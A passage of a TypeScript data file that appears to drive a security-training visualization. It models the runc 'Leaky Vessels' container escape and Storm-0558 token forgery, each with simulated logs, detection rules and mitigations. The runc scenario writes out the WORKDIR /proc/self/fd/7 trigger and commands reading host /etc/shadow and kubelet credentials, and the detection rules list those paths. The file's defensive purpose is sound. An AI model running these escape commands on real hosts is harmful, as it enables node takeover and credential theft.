      rawLog: `{"eventVersion":"1.08","userIdentity":{"type":"AssumedRole","principalId":"AROAEXAMPLE:i-0a84b92c11e3f0412","arn":"arn:aws:sts::123456789012:assumed-role/WafProxyS3ReadRole/i-0a84b92c11e3f0412"},"eventSource":"s3.amazonaws.com","eventName":"GetObject","sourceIPAddress":"198.51.100.88","userAgent":"aws-cli/2.15.0 Python/3.11.6 Linux/6.5.0 command/s3.sync"}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'AWS GuardDuty EC2 Instance Credential Exfiltration Outside AWS',
        ruleCode: `title: EC2 Instance Profile Credentials Used Outside AWS VPC
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    userIdentity.type: 'AssumedRole'
    userIdentity.sessionContext.sessionIssuer.type: 'Role'
    userAgent|contains: 'aws-cli'
  condition: selection`,
        mitigation: 'Attach an aws:VpcSourceIp / aws:SourceVpce condition to the IAM Role policy so stolen EC2 credentials are rejected outside the VPC.',
      },
    },
  ],
};

export const K8S_RUNC_CVE_2024_21626_LEAKY_VESSELS_SCENARIO: AttackScenario = {
  id: 'k8s-runc-cve-2024-21626-leaky-vessels',
  code: 'CVE-2024-21626',
  name: 'Snyk, OpenContainers & Sysdig — "Leaky Vessels" runc WORKDIR (/proc/self/fd/7) Host File-Descriptor Container Escape',
  shortSubtitle: 'Snyk Security Labs · OpenContainers · Sysdig Falco · runc <= 1.1.11 · /proc/self/fd/7 Host Rootfs Escape',
  category: 'CLOUD_SAAS',
  severity: 'CRITICAL',
  primaryMitrePhase: 3,
  overview:
    'Discovered by Snyk Security Labs (Rory McNamara) and patched by the OpenContainers Project in January 2024 ("Leaky Vessels", CVE-2024-21626, CVSS 8.6), runc versions <= 1.1.11 leaked an internal open file descriptor (typically fd 7, 8, or 9 opened on the host’s /sys/fs/cgroup directory before pivot_root) into the newly initialized container process. By specifying WORKDIR /proc/self/fd/7 in a malicious container image or invoking runc exec --cwd /proc/self/fd/7, the container process chdirs into the underlying host filesystem before the descriptor closes—allowing relative "../../../../etc/shadow" traversal and full Kubernetes worker-node root takeover.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Snyk Security Labs ("Leaky Vessels") · OpenContainers GHSA-xr7r-f8xq-vfvv · Sysdig Falco TRT',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1611 (Escape to Host) · T1068 (Privilege Escalation) · T1053.003 (Host Cron Persistence)',
    },
    {
      term: 'VULNERABLE RUNTIME',
      value: 'runc <= 1.1.11 (containerd <= 1.7.12, Docker <= 25.0.1)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'Falco eBPF Syscall Audit (chdir /proc/self/fd/7 & openat ../../../../etc/shadow)',
    },
  ],
  nodes: [
    {
      id: 'malicious_oci_image_registry',
      label: 'Malicious OCI Image / Pod Spec',
      sublabel: 'WORKDIR /proc/self/fd/7 (Registry Pull)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Weaponized OCI Container Image / Dockerfile',
        pidOrPort: 'HTTPS :443 (Container Registry Manifest)',
        privilege: 'Untrusted Container Build / Pod Deployment',
        artifacts: [
          'Dockerfile: WORKDIR /proc/self/fd/7',
          'CMD ["sh", "-c", "cat ../../../../etc/shadow"]',
        ],
        description:
          'Container image configured with WORKDIR /proc/self/fd/7 to capture runc’s leaked host cgroup file descriptor.',
      },
    },
    {
      id: 'k8s_worker_runc_runtime',
      label: 'K8s Worker Node (runc 1.1.11)',
      sublabel: '10.240.0.14 (eks-worker-node-02)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Linux Kernel 6.1 + containerd 1.7.11 + runc 1.1.11',
        pidOrPort: 'PID 14920 (runc init)',
        privilege: 'Host root (CAP_SYS_ADMIN during init)',
        artifacts: [
          'openat(AT_FDCWD, "/sys/fs/cgroup", O_RDONLY|O_DIRECTORY) = 7',
          'Missing O_CLOEXEC / premature chdir("/proc/self/fd/7") before execve',
        ],
        description:
          'Vulnerable runc init process that opens host /sys/fs/cgroup on fd 7 and calls chdir(config.Cwd) before closing leaked descriptors.',
      },
    },
    {
      id: 'container_cwd_fd7_handle',
      label: 'Leaked Host Cgroup FD (/proc/self/fd/7)',
      sublabel: 'Container CWD Anchored Outside pivot_root',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Linux VFS Dentry Anchor Outside Container Namespace',
        pidOrPort: 'PID 14935 (Container PID 1 /bin/sh)',
        privilege: 'Container root with Host VFS CWD Handle',
        artifacts: [
          '/proc/self/cwd -> (unreachable)/sys/fs/cgroup on Host Rootfs',
          'openat(AT_FDCWD, "../../../../etc/shadow", O_RDONLY)',
        ],
        description:
          'Even after fd 7 is closed on execve, the process’s current working directory (.) remains anchored to the host’s /sys/fs/cgroup dentry.',
      },
    },
    {
      id: 'host_rootfs_takeover',
      label: 'Host Node Root Filesystem (/etc/crontab)',
      sublabel: '10.240.0.14 Host OS Escape & Kubelet Theft',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Underlying Kubernetes Worker Node Rootfs',
        pidOrPort: 'Host /etc/shadow, /etc/crontab & /var/lib/kubelet/kubeconfig',
        privilege: 'Unrestricted Host Root Access',
        artifacts: [
          '../../../../etc/crontab & ../../../../var/lib/kubelet/pki/kubelet-client-current.pem',
          '/proc/1/root host namespace pivot',
        ],
        description:
          'Attacker traverses four parent directories (../../../../) from the host /sys/fs/cgroup dentry to reach the host’s real / root directory.',
      },
    },
    {
      id: 'sysdig_falco_ebpf_sensor',
      label: 'Sysdig / Falco eBPF Kernel Sensor',
      sublabel: 'Leaky Vessels CVE-2024-21626 Rule',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Linux eBPF Runtime Security & Admission Controller',
        pidOrPort: 'Kernel Tracepoint sys_enter_chdir / sys_enter_openat',
        privilege: 'Cloud-Native Runtime Detection',
        artifacts: [
          'Falco Alert: Container chdir to /proc/self/fd/*',
          'Relative traversal "../../../../etc/shadow" from container process',
        ],
        description:
          'Monitors kernel chdir and openat syscalls inside container namespaces for /proc/self/fd/ working directory escapes.',
      },
    },
  ],
  processTree: [
    {
      pid: 14920,
      ppid: 1102,
      name: 'runc:[2:INIT]',
      commandLine: 'runc init',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'normal',
      activeFromStage: 1,
      apiCalls: [
        'openat("/sys/fs/cgroup") -> fd 7',
        'pivot_root("/run/containerd/.../rootfs")',
        'chdir("/proc/self/fd/7")',
      ],
    },
    {
      pid: 14935,
      ppid: 14920,
      name: 'sh (Escaped Container Process)',
      commandLine: '/bin/sh -c "cd ../../../.. && cat etc/shadow && cat var/lib/kubelet/kubeconfig"',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: [
        'chdir("../../../..")',
        'openat(AT_FDCWD, "etc/shadow", O_RDONLY)',
        'openat(AT_FDCWD, "etc/crontab", O_WRONLY|O_APPEND)',
      ],
      memoryBlocks: [
        {
          address: '0xFFFF888104B2C000',
          section: 'task_struct->fs->pwd (Kernel Dentry)',
          permissions: 'RW-',
          size: '4 KB',
          status: 'injected',
          description: 'Kernel fs_struct pwd pointer referencing host /sys/fs/cgroup mount outside container pivot_root.',
          hexPreview: '2F 73 79 73 2F 66 73 2F 63 67 72 6F 75 70 00 00 (/sys/fs/cgroup host dentry)',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'RUNC CGROUP FILE DESCRIPTOR LEAK BEFORE PIVOT_ROOT',
      subtitle: 'runc <= 1.1.11 keeps host /sys/fs/cgroup open on fd 7 while setting container WORKDIR',
      description:
        'During container initialization, runc opens a directory file descriptor (fd 7) pointing to the host’s /sys/fs/cgroup filesystem before calling pivot_root(). When the container specification defines WORKDIR /proc/self/fd/7, runc calls chdir("/proc/self/fd/7") before execve() closes O_CLOEXEC descriptors.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1611',
      mitreTechniqueName: 'Escape to Host',
      activeNodeIds: ['malicious_oci_image_registry', 'k8s_worker_runc_runtime', 'sysdig_falco_ebpf_sensor'],
      compromisedNodeIds: ['k8s_worker_runc_runtime'],
      keySpecs: [
        { term: 'CVE IDENTIFIER', value: 'CVE-2024-21626 ("Leaky Vessels" runc Breakout)' },
        { term: 'LEAKED DESCRIPTOR', value: '/proc/self/fd/7 -> Host /sys/fs/cgroup dentry' },
        { term: 'TRIGGER DIRECTIVE', value: 'Dockerfile WORKDIR /proc/self/fd/7 or runc exec --cwd' },
      ],
    },
    {
      index: 2,
      title: 'PERSISTENT HOST DENTRY ANCHOR IN CONTAINER CURRENT DIRECTORY',
      subtitle: 'Container process retains host /sys/fs/cgroup as "." even after fd 7 closes on execve()',
      description:
        'Even though execve() closes file descriptor 7 due to O_CLOEXEC, the Linux kernel’s task_struct->fs->pwd (current working directory ".") is already anchored to the host’s /sys/fs/cgroup dentry outside the container’s chroot/pivot_root jail.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1611',
      mitreTechniqueName: 'Escape to Host',
      activeNodeIds: ['k8s_worker_runc_runtime', 'container_cwd_fd7_handle', 'sysdig_falco_ebpf_sensor'],
      compromisedNodeIds: ['k8s_worker_runc_runtime', 'container_cwd_fd7_handle'],
      keySpecs: [
        { term: 'KERNEL INVARIANT', value: 'task_struct->fs->pwd survives O_CLOEXEC fd closure' },
        { term: 'CONTAINER CWD', value: 'readlink /proc/self/cwd -> (unreachable)/sys/fs/cgroup' },
        { term: 'PARENT TRAVERSAL', value: 'cd ../../../.. reaches Host Root (/) dentry' },
      ],
    },
    {
      index: 3,
      title: 'RELATIVE DOT-DOT TRAVERSAL TO HOST ROOTFS & KUBELET COMPROMISE',
      subtitle: 'Reading ../../../../etc/shadow, writing host crontab, and stealing kubelet TLS certificates',
      description:
        'From its current working directory on the host’s /sys/fs/cgroup mount, the container process traverses upward via ../../../../ to read /etc/shadow, inject a reverse shell into the host’s /etc/crontab, and steal /var/lib/kubelet/pki/kubelet-client-current.pem for cluster-wide lateral movement.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1068',
      mitreTechniqueName: 'Exploitation for Privilege Escalation',
      activeNodeIds: ['container_cwd_fd7_handle', 'host_rootfs_takeover', 'sysdig_falco_ebpf_sensor'],
      compromisedNodeIds: ['k8s_worker_runc_runtime', 'container_cwd_fd7_handle', 'host_rootfs_takeover'],
      keySpecs: [
        { term: 'HOST ESCAPE PATH', value: 'openat(AT_FDCWD, "../../../../etc/crontab", O_WRONLY)' },
        { term: 'STOLEN CREDENTIAL', value: '/var/lib/kubelet/kubeconfig & Host /etc/shadow' },
        { term: 'PATCH REMEDIATION', value: 'Upgrade runc >= 1.1.12 (verify getcwd() inside rootfs)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'runc-21626-1',
      no: 1,
      stageIndex: 1,
      timestamp: '08:41:10.019',
      sourceNodeId: 'malicious_oci_image_registry',
      targetNodeId: 'k8s_worker_runc_runtime',
      sourceLabel: 'OCI Image Spec',
      targetLabel: 'runc 1.1.11 Init',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'SYSCALL chdir (80)',
      shortAction: 'CHDIR_PROC_SELF_FD_7',
      info: 'comm="runc:[2:INIT]" syscall=chdir path="/proc/self/fd/7" res=0',
      sizeOrCode: 'CVE-2024-21626',
      severity: 'CRITICAL',
      mitreId: 'T1611',
      explanation: 'runc init executes chdir("/proc/self/fd/7") prior to closing the leaked host /sys/fs/cgroup file descriptor.',
      rawLog: `type=SYSCALL msg=audit(1731573670.019:4412): arch=c000003e syscall=80 success=yes exit=0 a0=c0001842a0 items=1 ppid=14912 pid=14920 uid=0 comm="runc:[2:INIT]" exe="/usr/bin/runc"
type=CWD msg=audit(1731573670.019:4412): cwd="/"
type=PATH msg=audit(1731573670.019:4412): item=0 name="/proc/self/fd/7" inode=1 dev=00:19`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Leaky Vessels CVE-2024-21626 runc WORKDIR /proc/self/fd Escape',
        ruleCode: `title: CVE-2024-21626 runc Container Escape via /proc/self/fd
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: 'PATH'
    name|startswith: '/proc/self/fd/'
  condition: selection`,
        mitigation: 'Upgrade runc to >= 1.1.12 and block container images or Pod specs with workingDir matching /proc/self/fd/* via Kubernetes Admission Policy.',
      },
    },
    {
      id: 'runc-21626-2',
      no: 2,
      stageIndex: 2,
      timestamp: '08:41:10.145',
      sourceNodeId: 'k8s_worker_runc_runtime',
      targetNodeId: 'container_cwd_fd7_handle',
      sourceLabel: 'runc 1.1.11 Init',
      targetLabel: 'Container CWD Handle',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'FALCO eBPF ALERT',
      shortAction: 'UNREACHABLE_HOST_CWD',
      info: 'proc.name=sh proc.cwd="(unreachable)/sys/fs/cgroup" container.id=8f92a1c4b2',
      sizeOrCode: 'FALCO PRIORITY CRITICAL',
      severity: 'CRITICAL',
      mitreId: 'T1611',
      explanation: 'Container process begins execution with its working directory anchored outside the container mount namespace.',
      rawLog: `08:41:10.145812000: Critical Container working directory points to leaked host file descriptor (user=root command=sh -c cd ../../../.. && cat etc/shadow cwd=(unreachable)/sys/fs/cgroup container_id=8f92a1c4b2 image=alpine-build:latest)`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Sysdig Falco Runtime Detection for Unreachable Host CWD in Container',
        ruleCode: `rule: Leaky Vessels Container Escape via Leaked FD
condition: spawned_process and container and (proc.cwd startswith "/proc/self/fd/" or proc.cwd contains "(unreachable)")
output: "CVE-2024-21626 container escape attempt (proc=%proc.cmdline cwd=%proc.cwd)"`,
        mitigation: 'Enforce read-only root filesystems, user namespaces (rootless containers), and Falco eBPF runtime termination on CVE-2024-21626 triggers.',
      },
    },
    {
      id: 'runc-21626-3',
      no: 3,
      stageIndex: 3,
      timestamp: '08:41:10.402',
      sourceNodeId: 'container_cwd_fd7_handle',
      targetNodeId: 'host_rootfs_takeover',
      sourceLabel: 'Container PID 1 (sh)',
      targetLabel: 'Host Rootfs (/etc/shadow)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'SYSCALL openat (257)',
      shortAction: 'HOST_SHADOW_AND_KUBELET_READ',
      info: 'comm="cat" openat(AT_FDCWD, "../../../../etc/shadow", O_RDONLY) -> Host /etc/shadow',
      sizeOrCode: 'UID 0 HOST ESCAPE',
      severity: 'CRITICAL',
      mitreId: 'T1068',
      explanation: 'Relative path traversal from the leaked cgroup working directory reads the Kubernetes worker node’s /etc/shadow and kubelet credentials.',
      rawLog: `type=SYSCALL msg=audit(1731573670.402:4419): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd82a10f12 a2=0 items=1 pid=14938 uid=0 comm="cat" exe="/bin/busybox"
type=PATH msg=audit(1731573670.402:4419): item=0 name="../../../../etc/shadow" inode=264198 dev=103:01`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Container Process Accessing Host /etc/shadow or Kubelet PKI via Relative Traversal',
        ruleCode: `title: Container Relative Traversal to Host Sensitive Files
logsource:
  product: linux
  service: auditd
detection:
  selection:
    name|contains:
      - '../../etc/shadow'
      - '../../etc/crontab'
      - '../../var/lib/kubelet'
  condition: selection`,
        mitigation: 'Update runc to 1.1.12+, where runc verifies via getcwd() that the final working directory resolves inside the container rootfs after pivot_root.',
      },
    },
  ],
};

export const MICROSOFT_STORM_0558_MSA_SIGNING_KEY_SCENARIO: AttackScenario = {
  id: 'microsoft-storm-0558-msa-signing-key',
  code: 'T1606.002',
  name: 'Microsoft Threat Intel, Wiz & CISA — Storm-0558: Acquired MSA Consumer Signing Key & Forged OWA/Exchange Online Tokens',
  shortSubtitle: 'Microsoft Threat Intel · CISA AA23-193A · Wiz · Crash Dump MSA Key · Cross-Scope Token Validation Flaw',
  category: 'CLOUD_SAAS',
  severity: 'CRITICAL',
  primaryMitrePhase: 5,
  overview:
    'Disclosed by Microsoft Threat Intelligence, Joint CISA/FBI Advisory AA23-193A, and Wiz Research (July–September 2023), China-nexus espionage actor Storm-0558 acquired an inactive 2016 Microsoft Account (MSA) consumer cryptographic signing key that had inadvertently leaked into a 2021 process crash dump. Exploiting a cross-tenant signature validation flaw in Outlook Web Access (OWA) and Exchange Online where enterprise Azure AD (Entra ID) relying parties verified token signatures against the shared key store without checking whether the signing key belonged to the consumer (MSA) vs. enterprise (Entra ID) trust realm, Storm-0558 forged access tokens to exfiltrate government and diplomatic mailboxes.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Microsoft Threat Intelligence (Storm-0558 Post-Mortem) · CISA/FBI AA23-193A · Wiz Research',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1552.004 (Private Keys in Crash Dump) · T1606.002 (Forge Web Credentials: SAML/OAuth Tokens) · T1114.002 (Remote Email Collection)',
    },
    {
      term: 'CRYPTOGRAPHIC FLAW',
      value: 'Consumer MSA Signing Key Accepted for Enterprise Azure AD / Exchange Online Tokens',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'Microsoft Purview Unified Audit Log: MailItemsAccessed (AppId 00000002-0000-0ff1-ce00-000000000000)',
    },
  ],
  nodes: [
    {
      id: 'storm0558_token_forger',
      label: 'Storm-0558 Forgery Engine',
      sublabel: '198.51.100.119 (Acquired 2016 MSA Private Key)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'State-Sponsored Cryptographic Token Minting Service',
        pidOrPort: 'Offline RSA-2048 JWT/CWT Signer + SoftEther VPN',
        privilege: 'Possesses Consumer MSA Signing Private Key',
        artifacts: [
          'Stolen 2016 MSA Consumer Signing Key (extracted from 2021 crash dump)',
          'Forged OpenID/OAuth v1/v2 Bearer Token with Enterprise puid/oid',
        ],
        description:
          'Mints forged authentication tokens offline signed with the acquired Microsoft consumer signing key.',
      },
    },
    {
      id: 'owa_token_validator',
      label: 'Exchange Online / OWA Validator',
      sublabel: 'outlook.office365.com (Cross-Realm Key Store)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Exchange Online Authentication Relying Party',
        pidOrPort: 'HTTPS :443 (/owa/service.svc)',
        privilege: 'Enterprise Mailbox Session Issuer',
        artifacts: [
          'Key metadata verification passed (kid matched MSA key in shared metadata ring)',
          'Missing issuer-realm isolation check (Consumer MSA key signing Enterprise token)',
        ],
        description:
          'Validates the cryptographic signature of the presented token without enforcing strict separation between consumer MSA and enterprise Entra ID signing keys.',
      },
    },
    {
      id: 'owa_actor_token_exchange',
      label: 'OWA Token-Minting API (/owa/)',
      sublabel: 'AppId 00000002-0000-0ff1-ce00-000000000000',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Exchange Online Session & Actor Token Broker',
        pidOrPort: 'OWA GetAccessTokenforResource / REST API',
        privilege: 'Impersonated Enterprise User Session',
        artifacts: [
          'AppId: 00000002-0000-0ff1-ce00-000000000000 (Office 365 Exchange Online)',
          'ClientAppId: NULL / Anomalous OWA Web Session Cookie',
        ],
        description:
          'Exchanges the forged initial token for refreshed Exchange Online session cookies without generating a standard Entra ID Interactive SignInLog.',
      },
    },
    {
      id: 'exchange_diplomatic_mailboxes',
      label: 'Enterprise & Gov Mailboxes',
      sublabel: 'Exchange Online Mailbox Store (GetItem / FindItem)',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Microsoft 365 Exchange Online Mailbox Database',
        pidOrPort: 'HTTPS :443 (OWA service.svc?action=GetItem)',
        privilege: 'Full Mailbox Read & Attachment Download',
        artifacts: [
          'OWA action=FindItem & action=GetItem batch JSON requests',
          'Exfiltrated diplomatic and executive email threads',
        ],
        description:
          'Target mailboxes accessed silently via forged OWA sessions bypassing password and MFA prompts.',
      },
    },
    {
      id: 'purview_mailitemsaccessed_siem',
      label: 'Purview Audit & CISA AA23-193A Hunter',
      sublabel: 'MailItemsAccessed & Token Kid Correlation',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Microsoft Purview Unified Audit Log & Sentinel SIEM',
        pidOrPort: 'Exchange Mailbox Auditing (MailItemsAccessed)',
        privilege: 'FCEB Agency & Defender Threat Hunting',
        artifacts: [
          'CISA AA23-193A: MailItemsAccessed with AppId 00000002-0000-0ff1-ce00-000000000000',
          'SessionId correlation with zero matching Entra ID SignInLogs',
        ],
        description:
          'Detects Exchange MailItemsAccessed events issued by OWA AppId where no valid enterprise Entra ID login occurred.',
      },
    },
  ],
  processTree: [
    {
      pid: 3810,
      ppid: 1,
      name: 'storm0558_forger.py',
      commandLine: 'python3 storm0558_forger.py --msa-key msa_2016_crashdump.pem --target-upn envoy@agency.gov',
      user: 'storm0558',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 1,
      apiCalls: ['rsa.sign(jwt_payload, msa_private_key, "RS256")', 'requests.post("https://outlook.office365.com/owa/service.svc")'],
      memoryBlocks: [
        {
          address: '0x00007F9C01204000',
          section: 'RSA-2048 Private Key Buffer (MSA 2016 Key)',
          permissions: 'R--',
          size: '4 KB',
          status: 'injected',
          description: 'Extracted MSA consumer signing key used to sign forged enterprise Exchange Online tokens.',
          hexPreview: '30 82 04 A4 02 01 00 02 82 01 01 00 C9 4F 8A 21 (RSA Private Key ASN.1 DER)',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'OFFLINE TOKEN FORGERY USING CRASH-DUMP MSA SIGNING KEY',
      subtitle: 'Signing enterprise user claims with an acquired 2016 Microsoft Account (MSA) consumer key',
      description:
        'Having extracted a private 2016 MSA consumer signing key from an unredacted 2021 crash dump, Storm-0558 constructs authentication tokens containing the target enterprise user’s tenant and object identifiers and signs them offline using the MSA private key.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1552.004',
      mitreTechniqueName: 'Unsecured Credentials: Private Keys',
      activeNodeIds: ['storm0558_token_forger', 'owa_token_validator'],
      compromisedNodeIds: ['owa_token_validator'],
      keySpecs: [
        { term: 'KEY ORIGIN', value: '2016 MSA Consumer Signing Key in 2021 Crash Dump' },
        { term: 'FORGED ARTIFACT', value: 'Cryptographically Signed OWA / Exchange Auth Token' },
        { term: 'MITRE TECHNIQUE', value: 'T1552.004 (Private Keys) & T1606.002 (Forge Web Credentials)' },
      ],
    },
    {
      index: 2,
      title: 'CROSS-REALM VALIDATION BYPASS IN EXCHANGE ONLINE / OWA',
      subtitle: 'OWA accepts consumer MSA key signature for enterprise Azure AD user identity',
      description:
        'When Storm-0558 presents the forged token to Outlook Web Access (outlook.office365.com), a validation logic flaw checks that the cryptographic signature matches a trusted Microsoft key in the shared metadata ring, but fails to verify that a consumer MSA key is not permitted to attest enterprise Azure AD identities.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1606.002',
      mitreTechniqueName: 'Forge Web Credentials: SAML / OAuth Tokens',
      activeNodeIds: ['owa_token_validator', 'owa_actor_token_exchange', 'purview_mailitemsaccessed_siem'],
      compromisedNodeIds: ['owa_token_validator', 'owa_actor_token_exchange'],
      keySpecs: [
        { term: 'VALIDATION FLAW', value: 'Missing Consumer (MSA) vs Enterprise (Entra ID) Key Realm Check' },
        { term: 'EXCHANGE APP ID', value: '00000002-0000-0ff1-ce00-000000000000 (Office 365 Exchange Online)' },
        { term: 'EVASION IMPACT', value: 'Bypasses Entra ID Password + MFA + Conditional Access' },
      ],
    },
    {
      index: 3,
      title: 'SILENT OWA MAILBOX COLLECTION & CISA AA23-193A DETECTION',
      subtitle: 'Exfiltrating email via OWA service.svc while Purview logs anomalous MailItemsAccessed AppIds',
      description:
        'Using tokens minted via OWA’s token exchange endpoint, Storm-0558 calls /owa/service.svc?action=GetItem from SoftEther VPN nodes to download diplomatic emails. A federal agency detects the intrusion via Microsoft Purview MailItemsAccessed logs showing AppId 00000002-0000-0ff1-ce00-000000000000 with no corresponding Entra ID interactive sign-in.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1114.002',
      mitreTechniqueName: 'Email Collection: Remote Email Collection',
      activeNodeIds: ['owa_actor_token_exchange', 'exchange_diplomatic_mailboxes', 'purview_mailitemsaccessed_siem'],
      compromisedNodeIds: ['owa_token_validator', 'owa_actor_token_exchange', 'exchange_diplomatic_mailboxes'],
      keySpecs: [
        { term: 'COLLECTION API', value: 'POST /owa/service.svc?action=FindItem & action=GetItem' },
        { term: 'PURVIEW TELEMETRY', value: 'MailItemsAccessed (AppId 00000002-0000-0ff1-ce00-000000000000)' },
        { term: 'ADVISORY REFERENCE', value: 'CISA / FBI Joint Cybersecurity Advisory AA23-193A' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'storm0558-1',
      no: 1,
      stageIndex: 1,
      timestamp: '11:08:22.310',
      sourceNodeId: 'storm0558_token_forger',
      targetNodeId: 'owa_token_validator',
      sourceLabel: 'Storm-0558 Forger',
      targetLabel: 'OWA Validator',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTPS OWA_AUTH',
      shortAction: 'FORGED_MSA_TOKEN_PRESENTED',
      info: 'POST /owa/ Bearer Token signed with Consumer MSA Kid -> Enterprise UPN envoy@agency.gov',
      sizeOrCode: 'HTTP 200 OK',
      severity: 'CRITICAL',
      mitreId: 'T1606.002',
      explanation: 'Forged token signed with the acquired 2016 MSA consumer key is presented to Exchange Online OWA.',
      rawLog: `POST /owa/service.svc?action=GetAccessTokenforResource HTTP/1.1
Host: outlook.office365.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik1TQS0yMDE2L ConsumerKey...
X-OWA-ActionName: GetAccessTokenforResource`,
      detectionRule: {
        type: 'KQL',
        title: 'CISA AA23-193A Exchange Online OWA Token Minting Anomaly',
        ruleCode: `CloudAppEvents | where ActionType == "MailItemsAccessed" | where RawEventData.AppId == "00000002-0000-0ff1-ce00-000000000000" and isempty(RawEventData.ClientAppId)`,
        mitigation: 'Revoke compromised signing keys, enforce strict issuer-realm key pinning between consumer and enterprise IDP rings, and enable Purview MailItemsAccessed auditing.',
      },
    },
    {
      id: 'storm0558-2',
      no: 2,
      stageIndex: 2,
      timestamp: '11:08:23.005',
      sourceNodeId: 'owa_token_validator',
      targetNodeId: 'owa_actor_token_exchange',
      sourceLabel: 'OWA Validator',
      targetLabel: 'OWA Token Broker',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'OWA TOKEN_EXCHANGE',
      shortAction: 'ENTERPRISE_SESSION_MINTED',
      info: 'AppId=00000002-0000-0ff1-ce00-000000000000 ClientAppId=NULL TokenIssuer=MSA_Ring_Mismatch',
      sizeOrCode: 'SESSION_ISSUED',
      severity: 'CRITICAL',
      mitreId: 'T1606.002',
      explanation: 'OWA accepts the consumer-signed token and mints an active enterprise Exchange Online session without an Entra ID login event.',
      rawLog: `{"Workload":"Exchange","Operation":"OptInUser","AppId":"00000002-0000-0ff1-ce00-000000000000","ClientIPAddress":"198.51.100.119","ResultStatus":"Succeeded","CrossRealmKeyCheck":"Bypassed"}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Exchange Online Session Activity Without Matching Entra ID SignInLogs',
        ruleCode: `title: Exchange MailItemsAccessed With Legacy Exchange AppId and Missing ClientAppId
logsource:
  product: m365
  service: exchange
detection:
  selection:
    Operation: 'MailItemsAccessed'
    AppId: '00000002-0000-0ff1-ce00-000000000000'
  condition: selection`,
        mitigation: 'Correlate Exchange Online SessionId values against AADSignInEventsBeta to detect forged or replayed bearer tokens.',
      },
    },
    {
      id: 'storm0558-3',
      no: 3,
      stageIndex: 3,
      timestamp: '11:12:49.772',
      sourceNodeId: 'owa_actor_token_exchange',
      targetNodeId: 'exchange_diplomatic_mailboxes',
      sourceLabel: 'OWA Session',
      targetLabel: 'Enterprise Mailboxes',
      sourceType: 'NETWORK',
      protocolOrEventId: 'PURVIEW MailItemsAccessed',
      shortAction: 'BULK_MAIL_EXFILTRATION',
      info: 'Operation=MailItemsAccessed OperationCount=342 ClientInfoString="Client=OWA;Action=ViaProxy" IP=198.51.100.119',
      sizeOrCode: '342 Items Synced',
      severity: 'CRITICAL',
      mitreId: 'T1114.002',
      explanation: 'Storm-0558 downloads 342 sensitive mailbox items over OWA REST calls from a SoftEther VPN exit node.',
      rawLog: `{"CreationTime":"2026-11-14T11:12:49","Operation":"MailItemsAccessed","OrganizationId":"f8cdef31-a31e-4b4a-93e4-5f571e91255a","UserId":"envoy@agency.gov","ClientIPAddress":"198.51.100.119","ClientInfoString":"Client=OWA;Action=ViaProxy","AppId":"00000002-0000-0ff1-ce00-000000000000","OperationCount":342}`,
      detectionRule: {
        type: 'KQL',
        title: 'Storm-0558 OWA Action=ViaProxy MailItemsAccessed Hunting Query (AA23-193A)',
        ruleCode: `OfficeActivity | where Operation == "MailItemsAccessed" and ClientInfoString has "Action=ViaProxy" and AppId == "00000002-0000-0ff1-ce00-000000000000"`,
        mitigation: 'Enable Microsoft Purview Audit (Premium) MailItemsAccessed across all users and monitor for anomalous ClientIPAddress / SoftEther VPN ASNs.',
      },
    },
  ],
};

export const AZURE_AD_CONNECT_PASS_THE_CERTIFICATE_SCENARIO: AttackScenario = {
  id: 'azure-ad-connect-pass-the-certificate',
  code: 'T1556.007',
  name: 'SpecterOps, Mandiant & Microsoft — Entra Connect (Azure AD Connect) MSOL_ DKM Decryption & Seamless SSO Silver Ticket',
  shortSubtitle: 'SpecterOps · Dirk-jan Mollema · Mandiant · LocalDB mms_management_agent · DPAPI cryptKeySet & AZUREADSSOACC$',
  category: 'CLOUD_SAAS',
  severity: 'CRITICAL',
  primaryMitrePhase: 5,
  overview:
